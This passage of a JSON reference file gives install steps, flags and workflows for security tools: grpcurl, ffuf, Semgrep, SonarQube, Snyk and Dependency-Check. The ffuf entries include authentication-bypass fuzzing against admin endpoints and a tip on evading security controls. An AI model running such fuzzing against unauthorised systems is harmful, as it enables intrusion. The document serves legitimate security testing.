            "details": "Invoke method using proto definitions.",
            "command": "grpcurl -proto service.proto -d '{\"id\": 123}' localhost:50051 myservice.MyService/GetUser"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Discovery  Analysis  Testing  Documentation",
        "stages": [
          {
            "label": "Service Discovery",
            "description": "Discover available gRPC services",
            "command": "grpcurl -plaintext target:50051 list"
          },
          {
            "label": "Method Analysis",
            "description": "Analyze service methods and messages",
            "command": "grpcurl -plaintext target:50051 describe myservice.MyService"
          },
          {
            "label": "Functional Testing",
            "description": "Test each RPC method with various inputs",
            "command": "grpcurl -plaintext -d @test.json target:50051 myservice.MyService/CreateUser"
          },
          {
            "label": "Security Testing",
            "description": "Test authentication and authorization",
            "command": "grpcurl -insecure -cacert ca.crt -cert client.crt -key client.key target:443 myservice.MyService/SecureMethod"
          },
          {
            "label": "Documentation",
            "description": "Generate API documentation",
            "command": "grpcurl -plaintext target:50051 describe > api-docs.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "myservice.MyService",
        "meaning": "Available gRPC service on server",
        "severity": "info"
      },
      {
        "indicator": "rpc GetUser (myservice.UserRequest) returns (myservice.User)",
        "meaning": "RPC method definition with input/output types",
        "severity": "info"
      },
      {
        "indicator": "ERROR: Code: Unauthenticated",
        "meaning": "Authentication required for this method",
        "severity": "warning"
      },
      {
        "indicator": "ERROR: Code: Unimplemented",
        "meaning": "Method not implemented or not available",
        "severity": "error"
      }
    ],
    "advanced_usage": [
      {
        "title": "TLS with Mutual Authentication",
        "command": "grpcurl -insecure \\\n  -cacert ca.crt \\\n  -cert client.crt \\\n  -key client.key \\\n  server.example.com:443 \\\n  myservice.MyService/SecureMethod",
        "scenario": "Connect to secure gRPC service with client certificates",
        "notes": ["Ensure proper certificate chain and key formats"]
      },
      {
        "title": "Stream Processing",
        "command": "grpcurl -plaintext -d @stream-input.json localhost:50051 myservice.MyService/StreamData",
        "scenario": "Test streaming gRPC methods",
        "notes": ["Use file input for complex streaming data"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "grpcurl Documentation",
        "url": "https://github.com/fullstorydev/grpcurl",
        "description": "Official grpcurl repository and documentation"
      },
      {
        "label": "gRPC Tools Comparison",
        "url": "https://grpc.io/docs/guides/tools/",
        "description": "Overview of gRPC development and testing tools"
      },
      {
        "label": "Protocol Buffers Guide",
        "url": "https://developers.google.com/protocol-buffers",
        "description": "Protocol Buffers documentation and tutorials"
      }
    ]
  },
  {
    "id": "ffuf-api",
    "name": "ffuf API Mode",
    "summary": "ffuf's API mode provides specialized fuzzing capabilities for REST APIs, endpoints, and parameters with enhanced filtering and response analysis for API security testing.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Go or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "go install github.com/ffuf/ffuf/v2@latest",
            "copyable": true
          },
          {
            "detail": "ffuf -version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or install via package manager",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y ffuf",
            "copyable": true
          },
          {
            "detail": "# Alternative: Go install",
            "copyable": false
          },
          {
            "detail": "go install github.com/ffuf/ffuf/v2@latest",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker container for isolated execution",
        "steps": [
          {
            "detail": "docker pull ffuf/ffuf",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/data ffuf/ffuf -w /data/wordlist.txt -u https://api.example.com/FUZZ",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "API endpoint discovery",
        "command": "ffuf -w endpoints.txt -u https://api.example.com/FUZZ",
        "notes": ["Discover hidden API endpoints"]
      },
      {
        "description": "Parameter fuzzing",
        "command": "ffuf -w params.txt -u https://api.example.com/users?FUZZ=value",
        "notes": ["Find hidden parameters"]
      },
      {
        "description": "Header enumeration",
        "command": "ffuf -w headers.txt -H FUZZ: test -u https://api.example.com/users",
        "notes": ["Test custom headers"]
      },
      {
        "description": "HTTP method fuzzing",
        "command": "ffuf -w methods.txt -X FUZZ -u https://api.example.com/users",
        "notes": ["Test different HTTP methods"]
      }
    ],
    "common_flags": [
      {
        "flag": "-w, --wordlist",
        "description": "Wordlist file for fuzzing"
      },
      {
        "flag": "-u, --url",
        "description": "Target URL with FUZZ keyword"
      },
      {
        "flag": "-X, --request",
        "description": "HTTP method to use"
      },
      {
        "flag": "-H, --header",
        "description": "Custom HTTP headers"
      },
      {
        "flag": "-d, --data",
        "description": "POST data with FUZZ keyword"
      },
      {
        "flag": "-mc, --match-code",
        "description": "Match HTTP status codes"
      },
      {
        "flag": "-fc, --filter-code",
        "description": "Filter out HTTP status codes"
      }
    ],
    "operational_tips": [
      "Use -mc to focus on successful responses (200, 201, 202).",
      "Combine with -fc to filter out common error responses.",
      "Use multiple FUZZ keywords for complex payload testing.",
      "Save results with -o for later analysis.",
      "Use rate limiting (-rate) to avoid triggering security controls."
    ],
    "step_sequences": [
      {
        "title": "API Security Testing",
        "steps": [
          {
            "title": "Endpoint discovery",
            "details": "Discover hidden API endpoints.",
            "command": "ffuf -w api-endpoints.txt -u https://api.example.com/v1/FUZZ -mc 200,201,202"
          },
          {
            "title": "Parameter fuzzing",
            "details": "Find hidden parameters on discovered endpoints.",
            "command": "ffuf -w parameters.txt -u https://api.example.com/v1/users?FUZZ=test -mc 200"
          },
          {
            "title": "Method enumeration",
            "details": "Test allowed HTTP methods.",
            "command": "ffuf -w methods.txt -X FUZZ -u https://api.example.com/v1/users -mc 200,405"
          },
          {
            "title": "Authentication testing",
            "details": "Test authentication bypasses.",
            "command": "ffuf -w auth-bypass.txt -H Authorization: FUZZ -u https://api.example.com/v1/admin"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Discovery  Enumeration  Testing  Validation",
        "stages": [
          {
            "label": "API Discovery",
            "description": "Find API endpoints and documentation",
            "command": "ffuf -w common-apis.txt -u https://target.com/FUZZ -mc 200"
          },
          {
            "label": "Parameter Fuzzing",
            "description": "Discover hidden parameters",
            "command": "ffuf -w parameters.txt -u https://target.com/api/users?FUZZ=value -mc 200"
          },
          {
            "label": "Method Testing",
            "description": "Test allowed HTTP methods",
            "command": "ffuf -w methods.txt -X FUZZ -u https://target.com/api/users"
          },
          {
            "label": "Authentication Bypass",
            "description": "Test for authentication flaws",
            "command": "ffuf -w auth-tokens.txt -H Authorization: Bearer FUZZ -u https://target.com/api/admin"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Status: 200 [Size: 1234] [Words: 45]",
        "meaning": "Successful response with content length",
        "severity": "info"
      },
      {
        "indicator": "Status: 401 [Size: 87] [Words: 12]",
        "meaning": "Authentication required for this endpoint",
        "severity": "warning"
      },
      {
        "indicator": "Status: 405 [Size: 156]",
        "meaning": "HTTP method not allowed",
        "severity": "info"
      },
      {
        "indicator": "Progress: 1234/5000 [24%]",
        "meaning": "Fuzzing progress indicator",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Multi-threaded API Testing",
        "command": "ffuf -w endpoints.txt -u https://api.example.com/FUZZ -t 50 -rate 100 -mc 200,201,202 -o results.json",
        "scenario": "High-performance API endpoint discovery",
        "notes": ["Adjust threads and rate based on target response"]
      },
      {
        "title": "Recursive API Fuzzing",
        "command": "ffuf -w endpoints.txt -u https://api.example.com/FUZZ -recursion -recursion-depth 3",
        "scenario": "Discover nested API endpoints",
        "notes": ["Use with caution to avoid infinite recursion"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "ffuf GitHub Repository",
        "url": "https://github.com/ffuf/ffuf",
        "description": "Official ffuf documentation and examples"
      },
      {
        "label": "API Fuzzing Wordlists",
        "url": "https://github.com/danielmiessler/SecLists",
        "description": "Comprehensive wordlists for API testing"
      },
      {
        "label": "ffuf Usage Guide",
        "url": "https://github.com/ffuf/ffuf#usage",
        "description": "Detailed usage examples and tutorials"
      }
    ]
  },
  {
    "id": "semgrep",
    "name": "Semgrep",
    "summary": "Semgrep is a fast, open-source static analysis tool that finds bugs, security vulnerabilities, and enforcement errors in code by matching patterns across multiple programming languages.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via pip or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y python3 python3-pip",
            "copyable": true
          },
          {
            "detail": "pip3 install semgrep",
            "copyable": true
          },
          {
            "detail": "semgrep --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via pip or pre-compiled binary",
        "steps": [
          {
            "detail": "sudo pip3 install semgrep",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download binary",
            "copyable": false
          },
          {
            "detail": "wget https://github.com/returntocorp/semgrep/releases/latest/download/semgrep-linux-x64.gz",
            "copyable": true
          },
          {
            "detail": "gunzip semgrep-linux-x64.gz && chmod +x semgrep-linux-x64",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official Docker image for containerized scanning",
        "steps": [
          {
            "detail": "docker pull returntocorp/semgrep",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v \"$PWD:/src\" returntocorp/semgrep --config=auto /src",
            "copyable": true
          },
          {
            "detail": "# With custom rules",
            "copyable": false
          },
          {
            "detail": "docker run --rm -v \"$PWD:/src\" -v \"$PWD/custom-rules:/rules\" returntocorp/semgrep --config=/rules /src",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Auto-configured scan",
        "command": "semgrep --config=auto .",
        "notes": ["Automatically detect languages and run appropriate rules"]
      },
      {
        "description": "Security rules scan",
        "command": "semgrep --config=p/security-audit .",
        "notes": ["Run OWASP security rules"]
      },
      {
        "description": "Custom rules directory",
        "command": "semgrep --config=rules/ .",
        "notes": ["Use custom Semgrep rules"]
      },
      {
        "description": "SARIF output",
        "command": "semgrep --config=auto --sarif .",
        "notes": ["Generate SARIF format for CI/CD integration"]
      }
    ],
    "common_flags": [
      {
        "flag": "--config",
        "description": "Rules configuration (auto, p/, path/, URL)"
      },
      {
        "flag": "--severity",
        "description": "Filter by severity (INFO, WARNING, ERROR)"
      },
      {
        "flag": "--json",
        "description": "Output results in JSON format"
      },
      {
        "flag": "--sarif",
        "description": "Output results in SARIF format"
      },
      {
        "flag": "--exclude",
        "description": "Exclude files or directories"
      },
      {
        "flag": "--max-lines-per-find",
        "description": "Maximum lines to display per finding"
      }
    ],
    "operational_tips": [
      "Use --config=auto for automatic language detection and rule selection.",
      "Create custom rules for application-specific security patterns.",
      "Integrate with CI/CD pipelines using SARIF output format.",
      "Use --exclude to avoid scanning test files and dependencies.",
      "Combine multiple rule configurations for comprehensive coverage."
    ],
    "step_sequences": [
      {
        "title": "CI/CD Integration Setup",
        "steps": [
          {
            "title": "Install Semgrep",
            "details": "Install Semgrep in CI environment.",
            "command": "pip3 install semgrep"
          },
          {
            "title": "Configure scan",
            "details": "Set up auto-configuration for repository.",
            "command": "semgrep --config=auto --baseline baseline.sarif ."
          },
          {
            "title": "Run scan",
            "details": "Execute scan and generate results.",
            "command": "semgrep --config=auto --sarif --output=results.sarif ."
          },
          {
            "title": "Upload results",
            "details": "Upload results to Semgrep Cloud Platform.",
            "command": "semgrep upload --sarif results.sarif"
          }
        ]
      },
      {
        "title": "Custom Rule Development",
        "steps": [
          {
            "title": "Write rule",
            "details": "Create custom Semgrep rule YAML.",
            "command": "rules/custon-rule.yaml"
          },
          {
            "title": "Test rule",
            "details": "Test rule against sample code.",
            "command": "semgrep --config=rules/custom-rule.yaml test_files/"
          },
          {
            "title": "Validate rule",
            "details": "Validate rule syntax and effectiveness.",
            "command": "semgrep --validate --config=rules/"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Code Analysis  Rule Tuning  CI Integration",
        "stages": [
          {
            "label": "Initial Scan",
            "description": "Run comprehensive scan with auto-configuration",
            "command": "semgrep --config=auto --json > initial_results.json"
          },
          {
            "label": "Results Analysis",
            "description": "Review findings and identify false positives",
            "command": "cat initial_results.json | jq '.results[] | {rule_id: .rule_id, message: .message, file: .path}'"
          },
          {
            "label": "Rule Customization",
            "description": "Create or modify rules for application context",
            "command": "Write custom rules in .semgrep/rules/"
          },
          {
            "label": "Baseline Creation",
            "description": "Establish baseline for future comparisons",
            "command": "semgrep --config=auto --baseline baseline.sarif ."
          },
          {
            "label": "CI Pipeline",
            "description": "Integrate with GitHub Actions for automated scanning",
            "command": "uses: returntocorp/semgrep-action@v1 with: config: auto"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "ERROR: Hard-coded credential found",
        "meaning": "Security vulnerability requiring immediate attention",
        "severity": "error"
      },
      {
        "indicator": "WARNING: Use of unsafe function",
        "meaning": "Potential security risk, review usage context",
        "severity": "warning"
      },
      {
        "indicator": "INFO: Code style violation",
        "meaning": "Code quality issue, consider refactoring",
        "severity": "info"
      },
      {
        "indicator": "Files scanned: 125, Findings: 8",
        "meaning": "Scan completed with identified issues",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Rule for API Key Exposure",
        "command": "rules:\n  - id: api-key-exposure\n    pattern: |\n      $X = \"$API_KEY\"\n    message: Hard-coded API key detected\n    severity: ERROR\n    languages: [python, javascript]",
        "scenario": "Detect hard-coded API keys in source code",
        "notes": ["Extend pattern to match various API key formats"]
      },
      {
        "title": "CI/CD with Baseline",
        "command": "semgrep --config=auto --baseline baseline.sarif --json --output=results.json .",
        "scenario": "Only report new findings since baseline",
        "notes": ["Useful for incremental security improvements"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Semgrep Documentation",
        "url": "https://semgrep.dev/docs/",
        "description": "Official Semgrep documentation and guides"
      },
      {
        "label": "Semgrep Rules Registry",
        "url": "https://semgrep.dev/r/",
        "description": "Community-contributed rules repository"
      },
      {
        "label": "Writing Rules",
        "url": "https://semgrep.dev/docs/writing-rules/",
        "description": "Guide for writing custom Semgrep rules"
      }
    ]
  },
  {
    "id": "sonarqube",
    "name": "SonarQube",
    "summary": "SonarQube is an open-source platform for continuous code quality and security inspection that provides detailed reports on code bugs, vulnerabilities, and code smells across multiple programming languages.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Docker or download binary package",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y docker.io",
            "copyable": true
          },
          {
            "detail": "docker run -d --name sonarqube -p 9000:9000 sonarqube:community",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download binary",
            "copyable": false
          },
          {
            "detail": "wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-9.9.0.65466.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Docker installation recommended for Kali",
        "steps": [
          {
            "detail": "systemctl start docker",
            "copyable": true
          },
          {
            "detail": "docker volume create sonarqube_data",
            "copyable": true
          },
          {
            "detail": "docker run -d --name sonarqube -p 9000:9000 -v sonarqube_data:/opt/sonarqube/data sonarqube:community",
            "copyable": true
          },
          {
            "detail": "# Access at http://localhost:9000 (admin/admin)",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Docker Compose for full stack deployment",
        "steps": [
          {
            "detail": "cat > docker-compose.yml << EOF\nversion: '3.8'\nservices:\n  sonarqube:\n    image: sonarqube:community\n    ports:\n      - \"9000:9000\"\n    environment:\n      - SONAR_JDBC_URL=jdbc:postgresql://db:5432/sonar\n      - SONAR_JDBC_USERNAME=sonar\n      - SONAR_JDBC_PASSWORD=sonar\n    depends_on:\n      - db\n  db:\n    image: postgres:13\n    environment:\n      - POSTGRES_USER=sonar\n      - POSTGRES_PASSWORD=sonar\n      - POSTGRES_DB=sonar\nEOF",
            "copyable": true
          },
          {
            "detail": "docker-compose up -d",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Maven project scan",
        "command": "mvn sonar:sonar -Dsonar.host.url=http://localhost:9000",
        "notes": ["Maven integration for Java projects"]
      },
      {
        "description": "Gradle project scan",
        "command": "./gradlew sonarqube -Dsonar.host.url=http://localhost:9000",
        "notes": ["Gradle integration for Java/Kotlin projects"]
      },
      {
        "description": "CLI scanner",
        "command": "sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=. -Dsonar.host.url=http://localhost:9000",
        "notes": ["Standalone scanner for any project type"]
      },
      {
        "description": "Docker scan",
        "command": "docker run --rm -v \"$PWD:/usr/src\" sonarsource/sonar-scanner-cli",
        "notes": ["Containerized scanning"]
      }
    ],
    "common_flags": [
      {
        "flag": "-Dsonar.projectKey",
        "description": "Unique project identifier"
      },
      {
        "flag": "-Dsonar.sources",
        "description": "Source code directory"
      },
      {
        "flag": "-Dsonar.host.url",
        "description": "SonarQube server URL"
      },
      {
        "flag": "-Dsonar.login",
        "description": "Authentication token"
      },
      {
        "flag": "-Dsonar.exclusions",
        "description": "Exclude files from analysis"
      }
    ],
    "operational_tips": [
      "Use quality gates to enforce code quality standards in CI/CD.",
      "Configure branch analysis for pull request quality checks.",
      "Set up portfolio management for multi-project oversight.",
      "Use custom rules for organization-specific coding standards.",
      "Integrate with issue trackers for automatic bug tracking."
    ],
    "step_sequences": [
      {
        "title": "Project Setup and Analysis",
        "steps": [
          {
            "title": "Install SonarQube",
            "details": "Deploy SonarQube server using Docker Compose.",
            "command": "docker-compose up -d sonarqube db"
          },
          {
            "title": "Create project",
            "details": "Create new project in SonarQube web interface.",
            "command": "Web UI  Projects  Create project"
          },
          {
            "title": "Generate token",
            "details": "Create authentication token for project.",
            "command": "My Account  Security  Generate token"
          },
          {
            "title": "Configure scanner",
            "details": "Set up sonar-project.properties file.",
            "command": "echo 'sonar.projectKey=myproject\nsonar.sources=.' > sonar-project.properties"
          },
          {
            "title": "Run analysis",
            "details": "Execute code analysis and upload results.",
            "command": "sonar-scanner -Dsonar.login=your_token"
          }
        ]
      },
      {
        "title": "CI/CD Integration",
        "steps": [
          {
            "title": "Quality Gate Setup",
            "details": "Configure quality gates for project standards.",
            "command": "Quality Gates  Create new gate  Set conditions"
          },
          {
            "title": "GitHub Actions",
            "details": "Add SonarQube scan to GitHub workflow.",
            "command": "uses: sonarsource/sonarqube-scan-action@master"
          },
          {
            "title": "Pull Request Decoration",
            "details": "Enable PR analysis for automated code review.",
            "command": "Project Settings  Pull Request Decoration  Enable"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Local Development  CI Integration  Quality Gates",
        "stages": [
          {
            "label": "IDE Integration",
            "description": "Install SonarLint for real-time code analysis",
            "command": "IDE Extensions  Install SonarLint"
          },
          {
            "label": "Local Scanning",
            "description": "Run local analysis before commits",
            "command": "sonar-scanner -Dsonar.host.url=http://localhost:9000"
          },
          {
            "label": "CI Pipeline",
            "description": "Automated analysis in CI/CD",
            "command": "GitHub Actions  sonarqube-scan-action"
          },
          {
            "label": "Quality Gate",
            "description": "Enforce quality standards",
            "command": "Quality Gate: New Code < 5% issues"
          },
          {
            "label": "Portfolio Management",
            "description": "Track quality across organization",
            "command": "Portfolio  Create portfolio  Add projects"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Coverage: 85.2% (New: 92.1%)",
        "meaning": "Test coverage metrics for codebase",
        "severity": "info"
      },
      {
        "indicator": "Bugs: 3 (New: 1)",
        "meaning": "Critical issues requiring immediate attention",
        "severity": "error"
      },
      {
        "indicator": "Vulnerabilities: 7 (New: 2)",
        "meaning": "Security vulnerabilities found in code",
        "severity": "error"
      },
      {
        "indicator": "Code Smells: 45 (New: 8)",
        "meaning": "Maintainability issues, should be addressed",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Quality Profile",
        "command": "sonar.profile=my-custom-profile\nsonar.profile.my-custom-profile.rule.java:S1123=true\nsonar.profile.my-custom-profile.rule.java:S1172=false",
        "scenario": "Create organization-specific quality standards",
        "notes": ["Fine-tune rules for project requirements"]
      },
      {
        "title": "Multi-language Project",
        "command": "sonar.projectKey=mixed-project\nsonar.sources=src/\nsonar.java.binaries=build/classes/\nsonar.javascript.lcov.reportPaths=coverage/lcov.info\nsonar.python.coverage.reportPaths=coverage/coverage.xml",
        "scenario": "Analyze polyglot codebase with language-specific settings",
        "notes": ["Configure each language appropriately"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "SonarQube Documentation",
        "url": "https://docs.sonarqube.org/",
        "description": "Official SonarQube documentation"
      },
      {
        "label": "SonarScanner CLI",
        "url": "https://docs.sonarqube.org/latest/analysis/scan/sonarscanner/",
        "description": "Standalone scanner documentation"
      },
      {
        "label": "Quality Gates",
        "url": "https://docs.sonarqube.org/latest/user-guide/quality-gates/",
        "description": "Setting up quality gates"
      }
    ]
  },
  {
    "id": "snyk",
    "name": "Snyk",
    "summary": "Snyk is a developer-first security scanning tool that finds and fixes vulnerabilities in dependencies, container images, and infrastructure as code throughout the development lifecycle.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm, snap, or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "# Option 1: npm install",
            "copyable": false
          },
          {
            "detail": "sudo npm install -g snyk",
            "copyable": true
          },
          {
            "detail": "# Option 2: snap install",
            "copyable": false
          },
          {
            "detail": "sudo snap install snyk",
            "copyable": true
          },
          {
            "detail": "snyk --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or download binary",
        "steps": [
          {
            "detail": "sudo npm install -g snyk",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download binary",
            "copyable": false
          },
          {
            "detail": "wget https://static.snyk.io/cli/latest/snyk-linux",
            "copyable": true
          },
          {
            "detail": "chmod +x snyk-linux && sudo mv snyk-linux /usr/local/bin/snyk",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Snyk Docker image for containerized scanning",
        "steps": [
          {
            "detail": "docker pull snyk/snyk-cli",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v \"$PWD:/project\" snyk/snyk-cli test",
            "copyable": true
          },
          {
            "detail": "# With authentication",
            "copyable": false
          },
          {
            "detail": "docker run --rm -v \"$PWD:/project\" -v \"$HOME/.config/snyk:/root/.config/snyk\" snyk/snyk-cli test",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Dependency scan",
        "command": "snyk test",
        "notes": ["Scan project dependencies for vulnerabilities"]
      },
      {
        "description": "Container scan",
        "command": "snyk container test node:16-alpine",
        "notes": ["Scan Docker images for vulnerabilities"]
      },
      {
        "description": "IaC scan",
        "command": "snyk iac test .",
        "notes": ["Scan Terraform/CloudFormation for security issues"]
      },
      {
        "description": "Monitor for new vulnerabilities",
        "command": "snyk monitor",
        "notes": ["Continuously monitor for newly disclosed vulnerabilities"]
      }
    ],
    "common_flags": [
      {
        "flag": "--severity",
        "description": "Filter by severity (low, medium, high, critical)"
      },
      {
        "flag": "--json",
        "description": "Output results in JSON format"
      },
      {
        "flag": "--sarif",
        "description": "Output results in SARIF format"
      },
      {
        "flag": "--all-projects",
        "description": "Scan all subdirectories as projects"
      },
      {
        "flag": "--fail-on",
        "description": "Exit with error on specified severity"
      }
    ],
    "operational_tips": [
      "Authenticate with 'snyk auth' to enable all features and monitoring.",
      "Use 'snyk wizard' to integrate with git hooks and CI/CD pipelines.",
      "Set up Snyk-to-GitHub integration for automatic PR comments.",
      "Use 'snyk ignore' to temporarily suppress false positives.",
      "Configure license policies to comply with organizational requirements."
    ],
    "step_sequences": [
      {
        "title": "Project Setup and Monitoring",
        "steps": [
          {
            "title": "Authenticate",
            "details": "Authenticate with Snyk account.",
            "command": "snyk auth"
          },
          {
            "title": "Initial scan",
            "details": "Perform initial vulnerability scan.",
            "command": "snyk test --json > initial-scan.json"
          },
          {
            "title": "Review results",
            "details": "Analyze vulnerabilities and their impact.",
            "command": "cat initial-scan.json | jq '.vulnerabilities[] | {packageName: .packageName, severity: .severity, version: .version}'"
          },
          {
            "title": "Set up monitoring",
            "details": "Enable continuous monitoring for new vulnerabilities.",
            "command": "snyk monitor"
          },
          {
            "title": "CI integration",
            "details": "Integrate with CI/CD pipeline for automated scanning.",
            "command": "Add snyk test to CI configuration"
          }
        ]
      },
      {
        "title": "Container Security Scanning",
        "steps": [
          {
            "title": "Build image",
            "details": "Build Docker image for testing.",
            "command": "docker build -t myapp:latest ."
          },
          {
            "title": "Scan image",
            "details": "Scan Docker image for vulnerabilities.",
            "command": "snyk container test myapp:latest --json > container-scan.json"
          },
          {
            "title": "Monitor image",
            "details": "Monitor image for future vulnerabilities.",
            "command": "snyk container monitor myapp:latest"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Development  Testing  Monitoring  Remediation",
        "stages": [
          {
            "label": "IDE Integration",
            "description": "Install Snyk plugin for real-time vulnerability detection",
            "command": "VS Code  Extensions  Install Snyk"
          },
          {
            "label": "Pre-commit Hook",
            "description": "Add Snyk test to pre-commit hooks",
            "command": "echo 'snyk test' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit"
          },
          {
            "label": "CI Pipeline",
            "description": "Integrate Snyk scanning in CI/CD",
            "command": "GitHub Actions  uses: snyk/actions/node@master"
          },
          {
            "label": "PR Comments",
            "description": "Enable Snyk PR comments for vulnerability discussion",
            "command": "Snyk  Integrations  GitHub  Enable PR comments"
          },
          {
            "label": "Continuous Monitoring",
            "description": "Monitor production dependencies for new vulnerabilities",
            "command": "snyk monitor --org=your-org"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": " High severity vulnerability found in lodash < 4.17.21",
        "meaning": "Critical dependency vulnerability requiring immediate update",
        "severity": "error"
      },
      {
        "indicator": " Tested 256 dependencies",
        "meaning": "Successfully scanned all project dependencies",
        "severity": "info"
      },
      {
        "indicator": "No vulnerabilities found",
        "meaning": "All dependencies are free of known vulnerabilities",
        "severity": "info"
      },
      {
        "indicator": "License: MIT (Compliant)",
        "meaning": "Dependency license meets policy requirements",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Policy Configuration",
        "command": "snyk policy set ignore --id=SNYK-JS-LODASH-567746 --reason='False positive - not exploitable in our context'",
        "scenario": "Manage vulnerability policies and ignore false positives",
        "notes": ["Document reasons for ignoring vulnerabilities"]
      },
      {
        "title": "Multi-project Scanning",
        "command": "find . -name package.json -exec dirname {} \\; | xargs -I {} snyk test {} --json > results/{}.json",
        "scenario": "Scan multiple projects in monorepo",
        "notes": ["Automate vulnerability management across large codebases"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Snyk Documentation",
        "url": "https://support.snyk.io/",
        "description": "Official Snyk documentation and guides"
      },
      {
        "label": "Snyk Open Source",
        "url": "https://snyk.io/open-source/",
        "description": "Open source vulnerability database"
      },
      {
        "label": "Snyk CLI Reference",
        "url": "https://support.snyk.io/hc/en-us/articles/360003822537-CLI-Reference",
        "description": "Complete CLI command reference"
      }
    ]
  },
  {
    "id": "dependency-check",
    "name": "OWASP Dependency-Check",
    "summary": "OWASP Dependency-Check is a software composition analysis tool that identifies project dependencies and checks for known vulnerabilities using the NVD (National Vulnerability Database).",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via package manager or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y dependency-check",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download binary",
            "copyable": false
          },
          {
            "detail": "wget https://github.com/jeremylong/DependencyCheck/releases/latest/download/dependency-check-8.4.0-release.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Available in Kali repositories",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y dependency-check",
            "copyable": true
          },
          {
            "detail": "dependency-check --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official Docker image for containerized scanning",
        "steps": [
          {
            "detail": "docker pull owasp/dependency-check",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v \"$PWD:/src\" owasp/dependency-check --scan /src",
            "copyable": true
          },
          {
            "detail": "# With custom output directory",
            "copyable": false
          },
          {
            "detail": "docker run --rm -v \"$PWD:/src\" -v \"$PWD/reports:/report\" owasp/dependency-check --scan /src --out /report",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic scan",
        "command": "dependency-check --project \"My Project\" --scan .",
        "notes": ["Scan current directory for vulnerable dependencies"]
      },
      {
        "description": "Maven project",
        "command": "dependency-check --project \"My Maven Project\" --scan ./pom.xml",
        "notes": ["Scan Maven pom.xml file"]
      },
      {
        "description": "Generate HTML report",
        "command": "dependency-check --project \"My Project\" --scan . --format HTML",
        "notes": ["Generate detailed HTML vulnerability report"]
      },
      {
        "description": "Skip certain updates",
        "command": "dependency-check --project \"My Project\" --scan . --skipUpdate --skipConfig",
        "notes": ["Faster scan for offline scenarios"]
      }
    ],
    "common_flags": [
      {
        "flag": "--project",
        "description": "Project name for reports"
      },
      {
        "flag": "--scan",
        "description": "Path to scan (directory or file)"
      },
      {
        "flag": "--format",
        "description": "Report format (HTML, XML, CSV, JSON)"
      },
      {
        "flag": "--out",
        "description": "Output directory for reports"
      },
      {
        "flag": "--suppression",
        "description": "File to suppress false positives"
      },
      {
        "flag": "--skipUpdate",
        "description": "Skip updating vulnerability database"
      }
    ],
    "operational_tips": [
